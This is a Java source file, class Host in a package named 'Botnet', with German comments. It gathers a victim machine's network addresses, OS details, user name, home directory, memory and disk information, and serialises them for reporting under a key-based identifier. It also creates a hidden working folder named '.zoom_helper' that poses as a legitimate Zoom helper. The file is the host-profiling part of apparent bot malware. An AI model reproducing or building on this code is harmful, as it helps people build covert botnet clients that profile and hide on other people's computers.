package Botnet;

import java.io.File;
import java.io.IOException;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.InterfaceAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.nio.file.FileSystems;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.util.ArrayList;
import java.util.List;
import java.util.StringTokenizer;

/**
 * Dies ist die Hauptklasse des Programms. 
 * Diese Klasse stellt einen Computer(HOST) mit all seinen Informationen dar.
 * @author Cedric Busacker
 *
 */
public class Host{
	private String IDENTIFIER;
	private String IPv4, IPv6;
	private String SUBNETMASKv4, SUBNETMASKv6;
	private String BROADCASTv4 , BROADCASTv6;
	private String OS_ARCH, OS_NAME, OS_VERSION, USER_DIR, USER_HOME, USER_NAME, OPERATING_PATH;
	private String JVM_AVAILABLE_PROCESSORS,JVM_TOTAL_MEMORY,JVM_MAX_MEMORY,JVM_FREE_MEMORY;
	private List<ArrayList<String>> FILESYSTEMS = null;

	
	/**
	 * Dieser Konstruktor ermittelt alle Inforamtionen über das lokale System falls "true" übergeben wird. Falls "false" übergeben wird, werden keine Informationen ermittelt sondern übergeben.
	 * @param bool
	 * @throws NoSuchAlgorithmException
	 * @throws InvalidKeySpecException
	 * @throws IOException
	 */
	public Host(boolean bool) throws NoSuchAlgorithmException, InvalidKeySpecException, IOException {
		if (bool) {
			ArrayList<String> tmp_list = getIP();
			IPv6 = tmp_list.get(0);
			IPv4 = tmp_list.get(3);
			SUBNETMASKv6 = tmp_list.get(1);
			SUBNETMASKv4 = tmp_list.get(4);
			BROADCASTv6 = tmp_list.get(2);
			BROADCASTv4 = tmp_list.get(5);
			getSytemProperties();
			getJVMProperties();
			getFilesystems();
		}
	}
	/**
	 * Ermittelt die lokalen IP-Adressen des Computers. Es wird dabei ermittelt: IPv4, IPv6, sowie die jeweiligen Subnetzmasken und die jeweiligen Broadcast-Adressen.
	 * @return
	 * @throws UnknownHostException
	 * @throws SocketException
	 */
	private ArrayList<String> getIP() throws UnknownHostException, SocketException {
		ArrayList<String> list = new ArrayList<String>();
		DatagramSocket socket = new DatagramSocket();
		socket.connect(InetAddress.getByName("2606:4700:4700::1111"), 0); // DNS-Server für IPv6
		String ip = socket.getLocalAddress().getHostAddress();
		if (ip.toString().equals("0.0.0.0")) {
			list.add(null);
			list.add(null);
			list.add(null);
			socket.connect(InetAddress.getByName("1.1.1.1"), 0); // IPv4 DNS-Server
			ip = socket.getLocalAddress().getHostAddress();
			list.add(ip);
			list.add(getSubnetmask(ip,4));
			list.add(getBroadcast(ip, 4));
			socket.close();
			return list;
		}else {
			list.add(ip);
			list.add(getSubnetmask(ip, 6));
			list.add(getBroadcast(ip, 6));
			socket.connect(InetAddress.getByName("1.1.1.1"), 0);
			ip = socket.getLocalAddress().getHostAddress();
			if(ip.equals(list.get(0))){
				list.add(null);
				list.add(null);
				list.add(null);
			}else{
				list.add(ip);
				list.add(getSubnetmask(ip,4));
				list.add(getBroadcast(ip, 4));
			}
			socket.close();
			return list;
		}
	}
	/**
	 * Ermittelt die Subnetzmasken für IPv4 und IPv6
	 * @param ip
	 * @param ver
	 * @return
	 */
	private String getSubnetmask(String ip, int ver) {
		try {
			NetworkInterface networkInterface = NetworkInterface.getByInetAddress(InetAddress.getByName(ip));
			
			if (ver==6) {
				return networkInterface.getInterfaceAddresses().get(1).getNetworkPrefixLength()+"";
			}
			else {
				return networkInterface.getInterfaceAddresses().get(0).getNetworkPrefixLength()+"";
			}
			
		} catch (NullPointerException | SocketException | UnknownHostException e ) {
			System.err.println("Couldn't determine subnetmask!");
		}
		return null;
	}
	/**
	 * Ermittelt den Broadcast für IPv4 und IPv6
	 * @param ip
	 * @param ver
	 * @return
	 */
	private String getBroadcast(String ip, int ver) {
		try {
			NetworkInterface networkInterface = NetworkInterface.getByInetAddress(InetAddress.getByName(ip));
			if (ver==6) {
				int size = networkInterface.getInterfaceAddresses().size();
				for (int i = 0; i <= size; i++) {
					InetAddress tmp_ip = networkInterface.getInterfaceAddresses().get(i).getAddress();
					if (tmp_ip.isLinkLocalAddress()) {
						return tmp_ip.getHostAddress();
					}
					
				}
				return null;
			}
			else {
				 for (InterfaceAddress interfaceAddress : networkInterface.getInterfaceAddresses()) 
				    {
				        InetAddress broadcast = interfaceAddress.getBroadcast();
				        if (broadcast == null) {
				            continue;
				        }else {
				        	 return broadcast.getHostAddress();
						}   
				    }
			}
			
		} catch (NullPointerException | SocketException | UnknownHostException e) {
			System.err.println("Couldn't determine broadcast address!");
		}
		return null;

	}
	/**
	 * Ermittelt alle lokalen Eigenschaften des Computers.
	 */
	private void getSytemProperties() {
		OS_ARCH = System.getProperty("os.arch");
		OS_NAME = System.getProperty("os.name");
		OS_VERSION = System.getProperty("os.version");
		USER_DIR = System.getProperty("user.dir");
		USER_HOME = System.getProperty("user.home");
		USER_NAME = System.getProperty("user.name");
		FileSystems.getDefault().getPath(USER_HOME, ".zoom_helper").toFile().mkdirs();
		OPERATING_PATH = FileSystems.getDefault().getPath(USER_HOME, ".zoom_helper").toString();
	}
	/**
	 * Ermittelt wichtige Eigenschaft der Java VM.
	 */
	private void getJVMProperties() {
		Runtime rt = Runtime.getRuntime();
		JVM_AVAILABLE_PROCESSORS = rt.availableProcessors()+"";
		JVM_FREE_MEMORY = rt.freeMemory()+"";
		JVM_MAX_MEMORY = rt.maxMemory()+"";
		JVM_TOTAL_MEMORY = rt.totalMemory()+"";
	}
	/**
	 * Ermittelt alle lokalen Festplatten sowie deren Pfad und Speicherkapazitäten.
	 * @return
	 */
	private List<ArrayList<String>> getFilesystems() {
		if (FILESYSTEMS==null) {
			
			File[] roots = File.listRoots();
			FILESYSTEMS = new ArrayList<ArrayList<String>>();
		    for (File root : roots) {
		    	ArrayList<String> list = new ArrayList<String>();
		    	list.add(root.getAbsolutePath()+"");
		    	list.add(root.getTotalSpace()+"");
		    	list.add(root.getFreeSpace()+"");
		    	list.add(root.getUsableSpace()+"");
		    	FILESYSTEMS.add(list);
		}
		    
	    }
		return FILESYSTEMS;
	}
	
	
	/**
	 * Gibt eine String Repräsentation des Computers wieder.
	 */
	public String toString() {
		if(IDENTIFIER==null) {
			try {
				IDENTIFIER = new Crypter().PublicKeyToString();
			} catch (NoSuchAlgorithmException | InvalidKeySpecException | IOException e) {
			}
		}
		String[] flags = {IDENTIFIER,OS_NAME, OS_VERSION, OS_ARCH, IPv6, BROADCASTv6, IPv4, BROADCASTv4, JVM_AVAILABLE_PROCESSORS, JVM_FREE_MEMORY, JVM_MAX_MEMORY, JVM_TOTAL_MEMORY, USER_DIR, USER_HOME, USER_NAME};
		String[] description = {"Identifier","Operation System Name", "OS Version", "Architecture", "IP v6", "Broadcast Address", "IPv4", "Broadcast Address", "Available Processors", "Free RAM", "Max RAM", "Total RAM", "User Directory", "Home Directory", "Username"};
		String string = "";
		for (int i = 0; i < flags.length; i++) {
			string += description[i]+": "+flags[i]+" \n";
		}
		string += "===================== \nFilesystems: ";
		if (FILESYSTEMS!=null) {
			List<ArrayList<String>> filesystems = FILESYSTEMS;
			string += filesystems.size()+"\n";
			for (int i = 0; i < filesystems.size(); i++) {
				string += "Absolute Path: " + filesystems.get(i).get(0) + "\n";
				string += "Total Space: " + filesystems.get(i).get(1) + "\n";
				string += "Free Space: " + filesystems.get(i).get(2) + "\n";
				string += "Useable Space: " + filesystems.get(i).get(3) + "\n";
				string += "===================== \n";
			}
		}

		return string;
	}
	
	/**
	 * Ermittelt alle Attribute aus dem übergebenen String.
	 * @param Host
	 */
	public void fromString(String Host) {
		StringTokenizer tokenizer = new StringTokenizer(Host, "\n");
		String token;
		ArrayList<String> tokens = new ArrayList<String>();
		while (tokenizer.hasMoreTokens()) {
			token = tokenizer.nextToken();
			if (!token.contains("===========")) {
				tokens.add(token.substring(token.indexOf(": ")+2));
			}
		}
		IDENTIFIER = tokens.get(0);
		OS_NAME = tokens.get(1);
		OS_VERSION = tokens.get(2);
		OS_ARCH = tokens.get(3);
		IPv6 = tokens.get(4);
		BROADCASTv6 = tokens.get(5);
		IPv4 = tokens.get(6);
		BROADCASTv4 = tokens.get(7);
		JVM_AVAILABLE_PROCESSORS = tokens.get(8);
		JVM_FREE_MEMORY = tokens.get(9);
		JVM_MAX_MEMORY = tokens.get(10);
		JVM_TOTAL_MEMORY = tokens.get(11);
		USER_DIR = tokens.get(12);
		USER_HOME = tokens.get(13);
		USER_NAME = tokens.get(14);
		FILESYSTEMS = new ArrayList<ArrayList<String>>();
		for (int j = 0; j < Integer.parseInt(tokens.get(15)); j++) {
			ArrayList<String> list = new ArrayList<String>();
	    	list.add(tokens.get(16+j*4));
	    	list.add(tokens.get(17+j*4));
	    	list.add(tokens.get(18+j*4));
	    	list.add(tokens.get(19+j*4));
	    	FILESYSTEMS.add(list);
		}
    	
	}
	
	// Getters und Setters 
	public String getIPv4() {
		return IPv4;
	}
	public void setIPv4(String iPv4) {
		IPv4 = iPv4;
	}
	public String getIPv6() {
		return IPv6;
	}
	public void setIPv6(String iPv6) {
		IPv6 = iPv6;
	}
	public String getSUBNETMASKv4() {
		return SUBNETMASKv4;
	}
	public void setSUBNETMASKv4(String sUBNETMASKv4) {
		SUBNETMASKv4 = sUBNETMASKv4;
	}
	public String getSUBNETMASKv6() {
		return SUBNETMASKv6;
	}
	public void setSUBNETMASKv6(String sUBNETMASKv6) {
		SUBNETMASKv6 = sUBNETMASKv6;
	}
	public String getBROADCASTv4() {
		return BROADCASTv4;
	}
	public void setBROADCASTv4(String bROADCASTv4) {
		BROADCASTv4 = bROADCASTv4;
	}
	public String getBROADCASTv6() {
		return BROADCASTv6;
	}
	public void setBROADCASTv6(String bROADCASTv6) {
		BROADCASTv6 = bROADCASTv6;
	}
	public String getOS_ARCH() {
		return OS_ARCH;
	}
	public void setOS_ARCH(String oS_ARCH) {
		OS_ARCH = oS_ARCH;
	}
	public String getOS_NAME() {
		return OS_NAME;
	}
	public void setOS_NAME(String oS_NAME) {
		OS_NAME = oS_NAME;
	}
	public String getOS_VERSION() {
		return OS_VERSION;
	}
	public void setOS_VERSION(String oS_VERSION) {
		OS_VERSION = oS_VERSION;
	}
	public String getUSER_DIR() {
		return USER_DIR;
	}
	public void setUSER_DIR(String uSER_DIR) {
		USER_DIR = uSER_DIR;
	}
	public String getUSER_HOME() {
		return USER_HOME;
	}
	public void setUSER_HOME(String uSER_HOME) {
		USER_HOME = uSER_HOME;
	}
	public String getUSER_NAME() {
		return USER_NAME;
	}
	public void setUSER_NAME(String uSER_NAME) {
		USER_NAME = uSER_NAME;
	}
	public String getJVM_MAX_MEMORY() {
		return JVM_MAX_MEMORY;
	}
	public String getJVM_AVAILABLE_PROCESSORS() {
		return JVM_AVAILABLE_PROCESSORS;
	}
	public void setJVM_AVAILABLE_PROCESSORS(String jVM_AVAILABLE_PROCESSORS) {
		JVM_AVAILABLE_PROCESSORS = jVM_AVAILABLE_PROCESSORS;
	}
	public String getJVM_TOTAL_MEMORY() {
		return JVM_TOTAL_MEMORY;
	}
	public void setJVM_TOTAL_MEMORY(String jVM_TOTAL_MEMORY) {
		JVM_TOTAL_MEMORY = jVM_TOTAL_MEMORY;
	}
	public String getJVM_FREE_MEMORY() {
		return JVM_FREE_MEMORY;
	}
	public void setJVM_FREE_MEMORY(String jVM_FREE_MEMORY) {
		JVM_FREE_MEMORY = jVM_FREE_MEMORY;
	}
	public String getIDENTIFIER() throws NoSuchAlgorithmException, InvalidKeySpecException, IOException {
		return IDENTIFIER;
	}
	
	public void setIDENTIFIER(String iDENTIFIER) {
		IDENTIFIER = iDENTIFIER;
	}
	public void setJVM_MAX_MEMORY(String jVM_MAX_MEMORY) {
		JVM_MAX_MEMORY = jVM_MAX_MEMORY;
	}
	public String getOPERATING_PATH() {
		return OPERATING_PATH;
	}
	public void setOPERATING_PATH(String oPERATING_PATH) {
		OPERATING_PATH = oPERATING_PATH;
	}
}
